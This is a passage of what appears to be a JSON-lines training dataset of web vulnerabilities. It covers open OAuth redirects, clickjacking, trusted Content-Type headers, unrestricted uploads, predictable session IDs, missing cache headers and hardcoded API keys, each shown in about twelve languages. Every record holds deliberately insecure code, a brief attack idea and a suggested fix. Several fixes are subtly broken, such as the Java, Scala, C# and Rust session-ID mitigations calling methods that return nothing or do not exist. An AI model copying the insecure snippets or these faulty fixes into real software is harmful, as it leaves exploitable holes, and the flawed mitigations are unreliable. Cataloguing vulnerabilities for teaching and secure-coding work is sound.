  "id": "vuln-528",
  "language": "Java",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "response.sendRedirect(request.getParameter(\"redirect_uri\"));",
  "exploitation_techniques": "Redirect OAuth flow to attacker-controlled site.",
  "mitigation": "Validate: if (ALLOWED_REDIRECTS.contains(url)) sendRedirect(url)"
}
{
  "id": "vuln-529",
  "language": "PHP",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "header('Location: ' . $_GET['redirect_uri']);",
  "exploitation_techniques": "Steal tokens via malicious redirect.",
  "mitigation": "Validate: if (in_array($redirect_uri, $allowed)) header('Location: ' . $redirect_uri);"
}
{
  "id": "vuln-530",
  "language": "Ruby",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "redirect_to params[:redirect_uri]",
  "exploitation_techniques": "Redirect to malicious OAuth handler.",
  "mitigation": "Validate: redirect_to redirect_uri if ALLOWED_REDIRECTS.include?(redirect_uri)"
}
{
  "id": "vuln-531",
  "language": "Go",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"redirect_uri\"), http.StatusFound)",
  "exploitation_techniques": "Steal OAuth tokens via redirect.",
  "mitigation": "Validate: if slices.Contains(ALLOWED_REDIRECTS, url) { http.Redirect(w, r, url, http.StatusFound) }"
}
{
  "id": "vuln-532",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "return Redirect(Request.Query[\"redirect_uri\"]);",
  "exploitation_techniques": "Redirect to attacker-controlled site.",
  "mitigation": "Validate: if (ALLOWED_REDIRECTS.Contains(url)) return Redirect(url);"
}
{
  "id": "vuln-533",
  "language": "Kotlin",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "call.respondRedirect(call.request.queryParameters[\"redirect_uri\"]!!)",
  "exploitation_techniques": "Steal tokens via malicious redirect.",
  "mitigation": "Validate: if (ALLOWED_REDIRECTS.contains(url)) call.respondRedirect(url)"
}
{
  "id": "vuln-534",
  "language": "Scala",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "Redirect(params(\"redirect_uri\"))",
  "exploitation_techniques": "Redirect OAuth flow to malicious site.",
  "mitigation": "Validate: if (ALLOWED_REDIRECTS.contains(url)) Redirect(url)"
}
{
  "id": "vuln-535",
  "language": "Rust",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "res.redirect(&req.query(\"redirect_uri\")?)",
  "exploitation_techniques": "Steal tokens via redirect.",
  "mitigation": "Validate: if ALLOWED_REDIRECTS.contains(&url) { res.redirect(url) }"
}
{
  "id": "vuln-536",
  "language": "Elixir",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "redirect conn, external: params[\"redirect_uri\"]",
  "exploitation_techniques": "Redirect to malicious OAuth handler.",
  "mitigation": "Validate: if Enum.member?(ALLOWED_REDIRECTS, url) do redirect conn, external: url end"
}
{
  "id": "vuln-537",
  "language": "Perl",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "$r->headers_out->set('Location' => $r->param('redirect_uri'));",
  "exploitation_techniques": "Steal OAuth tokens via redirect.",
  "mitigation": "Validate: $r->headers_out->set('Location' => $url) if grep { $url eq $_ } @allowed;"
}
{
  "id": "vuln-538",
  "language": "Node.js",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "app.get('/', (req, res) => res.send('Page'));",
  "exploitation_techniques": "Embed site in iframe to perform clickjacking.",
  "mitigation": "Set header: res.set('X-Frame-Options', 'DENY')"
}
{
  "id": "vuln-539",
  "language": "Python",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "@app.route('/') def index(): return 'Page'",
  "exploitation_techniques": "Iframe site for clickjacking attacks.",
  "mitigation": "Set: response.headers['X-Frame-Options'] = 'DENY'"
}
{
  "id": "vuln-540",
  "language": "Java",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "@GetMapping(\"/\") public String index() { return \"Page\"; }",
  "exploitation_techniques": "Embed in iframe for clickjacking.",
  "mitigation": "Set: response.setHeader(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-541",
  "language": "PHP",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "echo 'Page';",
  "exploitation_techniques": "Iframe site to perform clickjacking.",
  "mitigation": "Set: header('X-Frame-Options: DENY');"
}
{
  "id": "vuln-542",
  "language": "Ruby",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "get '/' do 'Page' end",
  "exploitation_techniques": "Embed site in iframe for clickjacking.",
  "mitigation": "Set: response.headers['X-Frame-Options'] = 'DENY'"
}
{
  "id": "vuln-543",
  "language": "Go",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"Page\") })",
  "exploitation_techniques": "Iframe site for clickjacking attacks.",
  "mitigation": "Set: w.Header().Set(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-544",
  "language": "C# (.NET)",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "[HttpGet(\"/\")] public IActionResult Index() { return Ok(\"Page\"); }",
  "exploitation_techniques": "Embed in iframe for clickjacking.",
  "mitigation": "Set: Response.Headers.Add(\"X-Frame-Options\", \"DENY\");"
}
{
  "id": "vuln-545",
  "language": "Kotlin",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "get(\"/\") { call.respondText(\"Page\") }",
  "exploitation_techniques": "Iframe site for clickjacking attacks.",
  "mitigation": "Set: call.response.header(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-546",
  "language": "Scala",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "get(\"/\") { Ok(\"Page\") }",
  "exploitation_techniques": "Embed site in iframe for clickjacking.",
  "mitigation": "Set: Ok(\"Page\").withHeaders(\"X-Frame-Options\" -> \"DENY\")"
}
{
  "id": "vuln-547",
  "language": "Rust",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "router.get(\"/\", |_, res| res.render_text(\"Page\"))",
  "exploitation_techniques": "Iframe site for clickjacking attacks.",
  "mitigation": "Set: res.header(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-548",
  "language": "Elixir",
  "vulnerability_type": "Clickjacking",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "get \"/\", PageController, :index # returns 'Page'",
  "exploitation_techniques": "Embed in iframe for clickjacking.",
  "mitigation": "Set: put_resp_header(conn, \"x-frame-options\", \"DENY\")"
}
{
  "id": "vuln-549",
  "language": "Perl",
  "vulnerability_type": "Clickjacking",
  "description": "No X-Frame-Options header.",
  "code_snippet": "$r->print('Page');",
  "exploitation_techniques": "Iframe site for clickjacking attacks.",
  "mitigation": "Set: $r->headers_out->set('X-Frame-Options' => 'DENY');"
}
{
  "id": "vuln-550",
  "language": "Node.js",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting client-supplied Content-Type headers.",
  "code_snippet": "if (req.headers['content-type'] === 'application/json') parseJson(req.body);",
  "exploitation_techniques": "Spoof Content-Type to bypass parsing checks.",
  "mitigation": "Validate payload: try { JSON.parse(req.body) } catch (e) { res.status(400); }"
}
{
  "id": "vuln-551",
  "language": "Python",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting Content-Type header for parsing.",
  "code_snippet": "if request.headers['Content-Type'] == 'application/json': json.loads(request.data)",
  "exploitation_techniques": "Spoof Content-Type to inject malicious data.",
  "mitigation": "Validate: json.loads(request.data) if request.is_json else abort(400)"
}
{
  "id": "vuln-552",
  "language": "Java",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Relying on client Content-Type header.",
  "code_snippet": "if (request.getContentType().equals(\"application/json\")) { parseJson(request.getInputStream()); }",
  "exploitation_techniques": "Spoof Content-Type to bypass validation.",
  "mitigation": "Validate: try { objectMapper.readValue(request.getInputStream(), Object.class); } catch (Exception e) { ... }"
}
{
  "id": "vuln-553",
  "language": "PHP",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting Content-Type header.",
  "code_snippet": "if ($_SERVER['CONTENT_TYPE'] === 'application/json') { json_decode(file_get_contents('php://input')); }",
  "exploitation_techniques": "Spoof Content-Type to inject data.",
  "mitigation": "Validate: $data = json_decode(file_get_contents('php://input')); if (json_last_error() === JSON_ERROR_NONE) { ... }"
}
{
  "id": "vuln-554",
  "language": "Ruby",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Relying on client-supplied Content-Type.",
  "code_snippet": "if request.content_type == 'application/json' then JSON.parse(request.body.read) end",
  "exploitation_techniques": "Spoof Content-Type to bypass parsing.",
  "mitigation": "Validate: JSON.parse(request.body.read) rescue render status: 400"
}
{
  "id": "vuln-555",
  "language": "Go",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting Content-Type header for parsing.",
  "code_snippet": "if r.Header.Get(\"Content-Type\") == \"application/json\" { json.NewDecoder(r.Body).Decode(&data) }",
  "exploitation_techniques": "Spoof Content-Type to inject malicious data.",
  "mitigation": "Validate: err := json.NewDecoder(r.Body).Decode(&data); if err != nil { http.Error(w, \"Invalid JSON\", 400) }"
}
{
  "id": "vuln-556",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Relying on Content-Type header.",
  "code_snippet": "if (Request.ContentType == \"application/json\") { JsonSerializer.Deserialize(Request.Body); }",
  "exploitation_techniques": "Spoof Content-Type to bypass checks.",
  "mitigation": "Validate: try { await JsonSerializer.DeserializeAsync(Request.Body); } catch { return BadRequest(); }"
}
{
  "id": "vuln-557",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting Content-Type header.",
  "code_snippet": "if (call.request.contentType().toString() == \"application/json\") { call.receive<String>() }",
  "exploitation_techniques": "Spoof Content-Type to inject data.",
  "mitigation": "Validate: try { Json.decodeFromString(call.receive<String>()) } catch (e: Exception) { call.respond(HttpStatusCode.BadRequest) }"
}
{
  "id": "vuln-558",
  "language": "Scala",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Relying on client Content-Type.",
  "code_snippet": "if (request.contentType.contains(\"application/json\")) { parse(request.body.asJson) }",
  "exploitation_techniques": "Spoof Content-Type to bypass parsing.",
  "mitigation": "Validate: parse(request.body.asJson).recover { case _ => BadRequest }"
}
{
  "id": "vuln-559",
  "language": "Rust",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting Content-Type header.",
  "code_snippet": "if req.headers().get(\"content-type\") == Some(&\"application/json\".into()) { serde_json::from_reader(req.body()?) }",
  "exploitation_techniques": "Spoof Content-Type to inject data.",
  "mitigation": "Validate: serde_json::from_reader(req.body()?).map_err(|_| StatusCode::BAD_REQUEST)"
}
{
  "id": "vuln-560",
  "language": "Elixir",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Relying on Content-Type header.",
  "code_snippet": "if get_req_header(conn, \"content-type\") == [\"application/json\"] do Jason.decode!(conn.body_params) end",
  "exploitation_techniques": "Spoof Content-Type to bypass checks.",
  "mitigation": "Validate: case Jason.decode(conn.body_params) do {:ok, _} -> ...; {:error, _} -> send_resp(conn, 400, \"Invalid JSON\") end"
}
{
  "id": "vuln-561",
  "language": "Perl",
  "vulnerability_type": "Insecure Content-Type Handling",
  "description": "Trusting Content-Type header for parsing.",
  "code_snippet": "if ($r->header('Content-Type') eq 'application/json') { decode_json($r->content); }",
  "exploitation_techniques": "Spoof Content-Type to inject data.",
  "mitigation": "Validate: eval { decode_json($r->content) } or $r->status(400);"
}
{
  "id": "vuln-562",
  "language": "Node.js",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "app.post('/upload', (req, res) => { req.files.file.mv('uploads/' + req.files.file.name); });",
  "exploitation_techniques": "Upload malicious files like .php scripts.",
  "mitigation": "Validate: if (['image/png', 'image/jpeg'].includes(req.files.file.mimetype)) { ... }"
}
{
  "id": "vuln-563",
  "language": "Python",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "file = request.files['file']; file.save('uploads/' + file.filename)",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if file.mimetype in ['image/png', 'image/jpeg']: file.save(...)"
}
{
  "id": "vuln-564",
  "language": "Java",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded files.",
  "code_snippet": "@PostMapping(\"/upload\") public void upload(@RequestParam(\"file\") MultipartFile file) { file.transferTo(new File(\"uploads/\" + file.getOriginalFilename())); }",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if (Arrays.asList(\"image/png\", \"image/jpeg\").contains(file.getContentType())) { ... }"
}
{
  "id": "vuln-565",
  "language": "PHP",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",
  "exploitation_techniques": "Upload executable scripts like .php.",
  "mitigation": "Validate: if (in_array($_FILES['file']['type'], ['image/png', 'image/jpeg'])) { ... }"
}
{
  "id": "vuln-566",
  "language": "Ruby",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded files.",
  "code_snippet": "file = params[:file]; File.open(\"uploads/#{file.original_filename}\", 'wb') { |f| f.write(file.tempfile) }",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if %w[image/png image/jpeg].include?(file.content_type) { ... }"
}
{
  "id": "vuln-567",
  "language": "Go",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "file, header, _ := r.FormFile(\"file\"); os.WriteFile(\"uploads/\"+header.Filename, file, 0644)",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if slices.Contains([]string{\"image/png\", \"image/jpeg\"}, header.Header.Get(\"Content-Type\")) { ... }"
}
{
  "id": "vuln-568",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded files.",
  "code_snippet": "[HttpPost(\"upload\")] public async Task Upload(IFormFile file) { await File.WriteAllBytesAsync(\"uploads/\" + file.FileName, file.OpenReadStream()); }",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if (new[] {\"image/png\", \"image/jpeg\"}.Contains(file.ContentType)) { ... }"
}
{
  "id": "vuln-569",
  "language": "Kotlin",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "val file = call.receiveMultipart().readPart() as FilePart; File(\"uploads/${file.fileName}\").writeBytes(file.streamProvider().readAllBytes())",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if (file.contentType in listOf(\"image/png\", \"image/jpeg\")) { ... }"
}
{
  "id": "vuln-570",
  "language": "Scala",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded files.",
  "code_snippet": "val file = request.body.asMultipartFormData.get.file(\"file\"); Files.write(Paths.get(\"uploads\", file.filename), file.ref)",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if (List(\"image/png\", \"image/jpeg\").contains(file.contentType)) { ... }"
}
{
  "id": "vuln-571",
  "language": "Rust",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "let file = req.multipart()?.next_field()?.unwrap(); fs::write(format!(\"uploads/{}\", file.name()?), file.bytes()?)?;",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if [\"image/png\", \"image/jpeg\"].contains(&file.content_type()?) { ... }"
}
{
  "id": "vuln-572",
  "language": "Elixir",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded files.",
  "code_snippet": "file = params[\"file\"]; File.write(\"uploads/#{file.filename}\", file.tempfile)",
  "exploitation_techniques": "Upload malicious files.",
  "mitigation": "Validate: if file.content_type in ~w(image/png image/jpeg) do File.write(...) end"
}
{
  "id": "vuln-573",
  "language": "Perl",
  "vulnerability_type": "Insecure File Upload",
  "description": "No validation of uploaded file types.",
  "code_snippet": "my $file = $r->upload('file'); open(my $fh, '>', \"uploads/$file->filename\");",
  "exploitation_techniques": "Upload executable scripts.",
  "mitigation": "Validate: if ($file->type =~ /^image\/(png|jpeg)$/) { ... }"
}
{
  "id": "vuln-574",
  "language": "Node.js",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "const sessionId = Date.now() + '-' + Math.random();",
  "exploitation_techniques": "Predict session IDs to hijack sessions.",
  "mitigation": "Use crypto.randomBytes(32).toString('hex')"
}
{
  "id": "vuln-575",
  "language": "Python",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs using time-based values.",
  "code_snippet": "session_id = f'{int(time.time())}{random.randint(0, 1000)}'",
  "exploitation_techniques": "Guess session IDs based on timestamp.",
  "mitigation": "Use secrets.token_hex(32)"
}
{
  "id": "vuln-576",
  "language": "Java",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "String sessionId = System.currentTimeMillis() + \"-\" + new Random().nextInt(1000);",
  "exploitation_techniques": "Predict IDs to hijack sessions.",
  "mitigation": "Use SecureRandom: new SecureRandom().nextBytes(new byte[32]).toString()"
}
{
  "id": "vuln-577",
  "language": "PHP",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "$session_id = time() . rand(1000, 9999);",
  "exploitation_techniques": "Guess session IDs based on time.",
  "mitigation": "Use session_id(bin2hex(random_bytes(32)))"
}
{
  "id": "vuln-578",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "session[:id] = Time.now.to_i.to_s + rand(1000).to_s",
  "exploitation_techniques": "Predict IDs to hijack sessions.",
  "mitigation": "Use SecureRandom.hex(32)"
}
{
  "id": "vuln-579",
  "language": "Go",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs using time.",
  "code_snippet": "sessionId := fmt.Sprintf(\"%d-%d\", time.Now().Unix(), rand.Intn(1000))",
  "exploitation_techniques": "Guess session IDs based on timestamp.",
  "mitigation": "Use crypto/rand: crypto.Read(bytes); hex.EncodeToString(bytes)"
}
{
  "id": "vuln-580",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "var sessionId = DateTime.Now.Ticks + \"-\" + new Random().Next(1000);",
  "exploitation_techniques": "Predict IDs to hijack sessions.",
  "mitigation": "Use RNGCryptoServiceProvider: GetBytes(new byte[32]).ToBase64String()"
}
{
  "id": "vuln-581",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "val sessionId = \"${System.currentTimeMillis()}-${Random().nextInt(1000)}\"",
  "exploitation_techniques": "Guess session IDs based on time.",
  "mitigation": "Use SecureRandom: SecureRandom().nextBytes(ByteArray(32)).toHex()"
}
{
  "id": "vuln-582",
  "language": "Scala",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "val sessionId = s\"${System.currentTimeMillis()}-${scala.util.Random.nextInt(1000)}\"",
  "exploitation_techniques": "Predict IDs to hijack sessions.",
  "mitigation": "Use SecureRandom: java.security.SecureRandom().nextBytes(new Array[Byte](32)).toHex"
}
{
  "id": "vuln-583",
  "language": "Rust",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "let session_id = format!(\"{}-{}\", SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(), thread_rng().gen::<u32>());",
  "exploitation_techniques": "Guess session IDs based on timestamp.",
  "mitigation": "Use rand::crypto::SystemRandom: SystemRandom.fill(&mut [0u8; 32]).to_hex()"
}
{
  "id": "vuln-584",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "session_id = \"#{:os.system_time(:second)}#{:rand.uniform(1000)}\"",
  "exploitation_techniques": "Predict IDs to hijack sessions.",
  "mitigation": "Use :crypto.strong_rand_bytes(32) |> Base.encode16()"
}
{
  "id": "vuln-585",
  "language": "Perl",
  "vulnerability_type": "Insecure Session ID Generation",
  "description": "Predictable session IDs.",
  "code_snippet": "my $session_id = time() . rand(1000);",
  "exploitation_techniques": "Guess session IDs based on time.",
  "mitigation": "Use Crypt::Random::Source: random_bytes(32)->hex;"
}
{
  "id": "vuln-586",
  "language": "Node.js",
  "vulnerability_type": "Insecure Cache Control",
  "description": "Sensitive data cached without control.",
  "code_snippet": "app.get('/user', (req, res) => res.json(userData));",
  "exploitation_techniques": "Access sensitive data from cache.",
  "mitigation": "Set headers: res.set('Cache-Control', 'no-store, no-cache, private')"
}
{
  "id": "vuln-587",
  "language": "Python",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive data.",
  "code_snippet": "@app.route('/user') def user(): return jsonify(user_data)",
  "exploitation_techniques": "Retrieve sensitive data from cache.",
  "mitigation": "Set: response.headers['Cache-Control'] = 'no-store, no-cache, private'"
}
{
  "id": "vuln-588",
  "language": "Java",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control headers for sensitive data.",
  "code_snippet": "@GetMapping(\"/user\") public User getUser() { return user; }",
  "exploitation_techniques": "Access cached sensitive data.",
  "mitigation": "Set: response.setHeader(\"Cache-Control\", \"no-store, no-cache, private\")"
}
{
  "id": "vuln-589",
  "language": "PHP",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive responses.",
  "code_snippet": "echo json_encode($user_data);",
  "exploitation_techniques": "Retrieve sensitive data from cache.",
  "mitigation": "Set: header('Cache-Control: no-store, no-cache, private');"
}
{
  "id": "vuln-590",
  "language": "Ruby",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive data.",
  "code_snippet": "get '/user' do user.to_json end",
  "exploitation_techniques": "Access sensitive data from cache.",
  "mitigation": "Set: response.headers['Cache-Control'] = 'no-store, no-cache, private'"
}
{
  "id": "vuln-591",
  "language": "Go",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control headers for sensitive data.",
  "code_snippet": "http.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(user) })",
  "exploitation_techniques": "Retrieve cached sensitive data.",
  "mitigation": "Set: w.Header().Set(\"Cache-Control\", \"no-store, no-cache, private\")"
}
{
  "id": "vuln-592",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive responses.",
  "code_snippet": "[HttpGet(\"user\")] public IActionResult GetUser() { return Ok(user); }",
  "exploitation_techniques": "Access sensitive data from cache.",
  "mitigation": "Set: Response.Headers.Add(\"Cache-Control\", \"no-store, no-cache, private\");"
}
{
  "id": "vuln-593",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive data.",
  "code_snippet": "get(\"/user\") { call.respond(user) }",
  "exploitation_techniques": "Retrieve cached sensitive data.",
  "mitigation": "Set: call.response.header(\"Cache-Control\", \"no-store, no-cache, private\")"
}
{
  "id": "vuln-594",
  "language": "Scala",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control headers for sensitive data.",
  "code_snippet": "get(\"/user\") { Ok(user) }",
  "exploitation_techniques": "Access sensitive data from cache.",
  "mitigation": "Set: Ok(user).withHeaders(\"Cache-Control\" -> \"no-store, no-cache, private\")"
}
{
  "id": "vuln-595",
  "language": "Rust",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive responses.",
  "code_snippet": "router.get(\"/user\", |_, res| res.render_json(user))",
  "exploitation_techniques": "Retrieve cached sensitive data.",
  "mitigation": "Set: res.header(\"Cache-Control\", \"no-store, no-cache, private\")"
}
{
  "id": "vuln-596",
  "language": "Elixir",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control for sensitive data.",
  "code_snippet": "get \"/user\", UserController, :show",
  "exploitation_techniques": "Access sensitive data from cache.",
  "mitigation": "Set: put_resp_header(conn, \"cache-control\", \"no-store, no-cache, private\")"
}
{
  "id": "vuln-597",
  "language": "Perl",
  "vulnerability_type": "Insecure Cache Control",
  "description": "No cache control headers for sensitive data.",
  "code_snippet": "$r->print(encode_json($user));",
  "exploitation_techniques": "Retrieve cached sensitive data.",
  "mitigation": "Set: $r->headers_out->set('Cache-Control' => 'no-store, no-cache, private');"
}
{
  "id": "vuln-598",
  "language": "Node.js",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
  "code_snippet": "const apiKey = '1234567890abcdef'; axios.get('https://api.com', { headers: { 'Authorization': apiKey } });",
  "exploitation_techniques": "Extract keys from source code or logs.",
  "mitigation": "Use environment variables: process.env.API_KEY"
}
{
  "id": "vuln-599",
  "language": "Python",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in code.",
  "code_snippet": "API_KEY = '1234567890abcdef'; requests.get('https://api.com', headers={'Authorization': API_KEY})",
  "exploitation_techniques": "Steal keys from source code.",
  "mitigation": "Use: os.getenv('API_KEY')"
}
{
  "id": "vuln-600",
  "language": "Java",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
  "code_snippet": "String apiKey = \"1234567890abcdef\"; HttpClient.get(\"https://api.com\", headers(\"Authorization\", apiKey));",
  "exploitation_techniques": "Extract keys from code or logs.",
  "mitigation": "Use: System.getenv(\"API_KEY\")"
}
{
  "id": "vuln-601",
  "language": "PHP",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
  "code_snippet": "$apiKey = '1234567890abcdef'; $ch = curl_init('https://api.com'); curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $apiKey]);",
  "exploitation_techniques": "Extract keys from source code or logs.",
  "mitigation": "Use environment variables: getenv('API_KEY')"
}
{
  "id": "vuln-602",
  "language": "Ruby",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in code.",
  "code_snippet": "API_KEY = '1234567890abcdef'; HTTParty.get('https://api.com', headers: { 'Authorization' => API_KEY })",
  "exploitation_techniques": "Steal keys from source code.",
  "mitigation": "Use: ENV['API_KEY']"
}
{
  "id": "vuln-603",
  "language": "Go",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
  "code_snippet": "apiKey := \"1234567890abcdef\"; req, _ := http.NewRequest(\"GET\", \"https://api.com\", nil); req.Header.Add(\"Authorization\", apiKey)",
  "exploitation_techniques": "Extract keys from code or logs.",
  "mitigation": "Use: os.Getenv(\"API_KEY\")"
}
{
  "id": "vuln-604",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in code.",
  "code_snippet": "string apiKey = \"1234567890abcdef\"; var client = new HttpClient(); client.DefaultRequestHeaders.Add(\"Authorization\", apiKey);",
  "exploitation_techniques": "Steal keys from source code.",
  "mitigation": "Use: Environment.GetEnvironmentVariable(\"API_KEY\")"
}
{
  "id": "vuln-605",
  "language": "Kotlin",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
  "code_snippet": "val apiKey = \"1234567890abcdef\"; val client = HttpClient().get(\"https://api.com\") { header(\"Authorization\", apiKey) }",
  "exploitation_techniques": "Extract keys from code or logs.",
  "mitigation": "Use: System.getenv(\"API_KEY\")"
}
{
  "id": "vuln-606",
  "language": "Scala",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in code.",
  "code_snippet": "val apiKey = \"1234567890abcdef\"; WS.url(\"https://api.com\").withHeaders(\"Authorization\" -> apiKey).get()",
  "exploitation_techniques": "Steal keys from source code.",
  "mitigation": "Use: sys.env(\"API_KEY\")"
}
{
  "id": "vuln-607",
  "language": "Rust",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
  "code_snippet": "let api_key = \"1234567890abcdef\"; let client = reqwest::Client::new().get(\"https://api.com\").header(\"Authorization\", api_key);",
  "exploitation_techniques": "Extract keys from code or logs.",
  "mitigation": "Use: std::env::var(\"API_KEY\")"
}
{
  "id": "vuln-608",
  "language": "Elixir",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in code.",
  "code_snippet": "api_key = \"1234567890abcdef\"; HTTPoison.get!(\"https://api.com\", [{\"Authorization\", api_key}])",
  "exploitation_techniques": "Steal keys from source code.",
  "mitigation": "Use: System.get_env(\"API_KEY\")"
}
{
  "id": "vuln-609",
  "language": "Perl",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoding API keys in source code.",
